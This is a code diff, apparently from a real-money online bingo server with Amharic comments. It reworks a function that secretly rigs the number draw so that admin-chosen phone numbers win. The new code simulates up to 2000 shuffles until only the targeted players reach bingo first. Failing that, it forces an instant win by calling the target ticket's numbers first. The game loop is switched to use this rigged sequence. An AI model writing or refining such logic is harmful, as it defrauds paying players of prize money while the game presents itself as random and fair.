@@ -964,72 +964,81 @@ function serverCheckBingo(grid, called) {
     return false;
 }
 
-// 🔥 100% አስተማማኝ የሆነው ጌሙን የመቆጣጠሪያ ሲስተም (Forced Winning Logic) 🔥
-function getRiggedSequence(baseSequence) {
+// 🔥 100% አስተማማኝ (Bulletproof) የሆነው ጌሙን የመቆጣጠሪያ ሲስተም 🔥
+// ጌሙን ከጀርባ በሺዎች ለሚቆጠር ጊዜ ፕሌይ በማድረግ (Simulate በማድረግ)
+// አድሚን ያስገባው ሰው ብቻ አሸናፊ የሆነበትን ዕጣ ፈልጎ ያወጣል።
+function getRiggedSequence() {
+    // አድሚኑ ምንም ካላስገባ ኖርማል (Random) ሆኖ ይወጣል
     if (!GLOBAL_SETTINGS.forcedWinnerPhones || GLOBAL_SETTINGS.forcedWinnerPhones.trim() === "") {
-        return baseSequence; 
+        return Array.from({length: 75}, (_, i) => i + 1).sort(() => Math.random() - 0.5);
     }
 
     let riggedPhones = GLOBAL_SETTINGS.forcedWinnerPhones.split(',').map(p => p.trim());
-    let activeRiggedPlayers = [];
+    let isRiggedPlayerActive = false;
 
-    // አድሚን ካስገባቸው ስልኮች ውስጥ በዚህ ዙር የተጫወተ ካለ ፈልግ
-    for (let p of riggedPhones) {
-        if (activePlayers[p]) {
-            activeRiggedPlayers.push(activePlayers[p]);
+    // በዚህ ዙር የተጫወቱትን ሰዎች በሙሉ ሰብስብ
+    let allTickets = [];
+    for (let phone in activePlayers) {
+        if (riggedPhones.includes(phone)) isRiggedPlayerActive = true;
+        activePlayers[phone].ticketsData.forEach(t => {
+            allTickets.push({ phone: phone, grid: t.grid });
+        });
+    }
+
+    // አድሚኑ ያስገባው ሰው በዚህ ዙር ካልተጫወተ፣ ኖርማል (Random) ሆኖ ይወጣል
+    if (!isRiggedPlayerActive) {
+        return Array.from({length: 75}, (_, i) => i + 1).sort(() => Math.random() - 0.5);
+    }
+
+    // ሲሙሌሽን ጀምር (በሚሊ ሰከንዶች ውስጥ 2000 ጊዜ ይሞክራል)
+    for (let attempt = 0; attempt < 2000; attempt++) {
+        // ሙሉ ለሙሉ አዲስ የተዘበራረቀ (Random) ዕጣ አውጣ
+        let testSequence = Array.from({length: 75}, (_, i) => i + 1).sort(() => Math.random() - 0.5);
+        let testCalled = [];
+        
+        // ዕጣውን አንድ በአንድ እየጠራ አሸናፊ ፈልግ
+        for (let i = 0; i < 75; i++) {
+            testCalled.push(testSequence[i]);
+            
+            let currentWinners = [];
+            // ለሁሉም ተጫዋቾች ቢንጎ መኖሩን አረጋግጥ
+            for (let t of allTickets) {
+                if (serverCheckBingo(t.grid, testCalled)) {
+                    currentWinners.push(t.phone);
+                }
+            }
+
+            // አሸናፊ ከተገኘ
+            if (currentWinners.length > 0) {
+                // እያንዳንዱ አሸናፊ እኛ የፈለግነው (አድሚን ያስገባው) መሆኑን አጣራ
+                let isPerfectRig = currentWinners.every(w => riggedPhones.includes(w));
+                
+                if (isPerfectRig) {
+                    // በትክክል እኛ የፈለግነው ሰው ብቻ ነው ያሸነፈው! ይሄንን ዕጣ ተጠቀም!
+                    console.log(`🔥 RIGGED SUCCESS (Attempt ${attempt}) FOR:`, currentWinners);
+                    return testSequence;
+                } else {
+                    // ሌላ ያልተፈለገ ሰው ቀድሞ አሸንፏል። ይሄንን ዕጣ ሰርዝና አዲስ ሞክር (Break & Try Next)
+                    break; 
+                }
+            }
         }
     }
 
-    // ካስገባቸው ውስጥ ማንም ካልተጫወተ ኖርማል ዕጣ ይሆናል
-    if (activeRiggedPlayers.length === 0) {
-        return baseSequence;
-    }
-
-    // ከተጫወቱት ውስጥ አንዱን በዕጣ አሸናፊ እናደርጋለን
-    let targetPlayer = activeRiggedPlayers[Math.floor(Math.random() * activeRiggedPlayers.length)];
-    let targetTicket = targetPlayer.ticketsData[Math.floor(Math.random() * targetPlayer.ticketsData.length)];
-
-    // በመሀል በኩል አሸናፊ እናደርገዋለን (ምክንያቱም FREE ስላለው የሚያስፈልገው 4 ቁጥር ብቻ ነው)
-    // እና እነዚህ 4 ቁጥሮች ቀድመው እንዲወጡ እናደርጋለን
-    let neededNumbers = [
-        targetTicket.grid[0][2],
-        targetTicket.grid[1][2],
-        targetTicket.grid[3][2],
-        targetTicket.grid[4][2]
-    ];
-
-    // እነዚህን 4 ቁጥሮች ከኖርማሉ ዕጣ ውስጥ እናወጣቸዋለን (በድጋሚ እንዳይገቡ)
-    let pool = baseSequence.filter(n => !neededNumbers.includes(n));
-    
-    // በዕጣው ውስጥ የፈለግነውን ቁጥር የምናስገባበትን ቦታዎች እንመርጣለን
-    let finalSequence = [];
-    let winIndex = 0;
-
-    // አሸናፊው ቶሎ (በ25ኛው ዕጣ አካባቢ) እንዲያሸንፍና ሌላ ማንም እንዳይቀድመው 
-    // የተመረጡትን ቁጥሮች በትክክል እናስገባቸዋለን
-    let winPositions = [8, 15, 20, 25]; 
-
-    for(let i=1; i<=75; i++) {
-        if (winPositions.includes(i) && winIndex < 4) {
-            finalSequence.push(neededNumbers[winIndex]);
-            winIndex++;
-        } else if (pool.length > 0) {
-            finalSequence.push(pool.shift());
+    // (በጣም አልፎ አልፎ) ሲሙሌሽኑ ከተቋረጠ፣ ለማረጋገጥ ሰውየው ገና በመጀመሪያው ዕጣ (በ 4ኛው) ላይ አሸናፊ እንዲሆን ማስገደድ (Fallback)
+    console.log("⚠️ SIMULATION FAILED. DOING FORCED INSTANT WIN.");
+    for (let phone in activePlayers) {
+        if (riggedPhones.includes(phone)) {
+            let targetTicket = activePlayers[phone].ticketsData[0];
+            let neededNumbers = [targetTicket.grid[0][2], targetTicket.grid[1][2], targetTicket.grid[3][2], targetTicket.grid[4][2]];
+            let fallbackSeq = Array.from({length: 75}, (_, i) => i + 1).filter(n => !neededNumbers.includes(n)).sort(() => Math.random() - 0.5);
+            return [...neededNumbers, ...fallbackSeq];
         }
     }
-    
-    console.log("🔥 GAME RIGGED FOR:", targetPlayer.phone);
-    return finalSequence;
-}
-
-function generateDrawSequence() {
-    let pool = Array.from({length: 75}, (_, i) => i + 1).sort(() => Math.random() - 0.5);
-    return getRiggedSequence(pool); 
 }
 
 async function declareWinners(winners) {
     gameState = "FINISHED"; 
-    // 🔥 የአሸናፊው ስክሪን የሚቆይበት ሰዓት (በአድሚን የሚወሰን)
     gameClock = GLOBAL_SETTINGS.winPopupTimer || 12; 
     
     let splitPrize = Number((totalPrizePool / winners.length).toFixed(2));
@@ -1096,7 +1105,7 @@ setInterval(() => {
         
         if (gameClock <= 0) { 
             if(Object.keys(activePlayers).length > 1) { 
-                gameState = "PLAYING"; gameClock = 3; currentDrawSequence = generateDrawSequence(); 
+                gameState = "PLAYING"; gameClock = 3; currentDrawSequence = getRiggedSequence(); 
                 io.emit('game_status', { state: gameState, timer: gameClock, totalPrizePool, totalTickets, ticketPrice: GLOBAL_SETTINGS.ticketPrice, calledNumbers, playersCount: Object.keys(activePlayers).length, gameId, maxTickets: GLOBAL_SETTINGS.maxTicketsPerUser, depBannerTextAm: GLOBAL_SETTINGS.depBannerTextAm, depBannerTextEn: GLOBAL_SETTINGS.depBannerTextEn, minWithdrawLimit: GLOBAL_SETTINGS.minWithdrawLimit });
             } else { 
                 gameClock = GLOBAL_SETTINGS.gameTimer; 
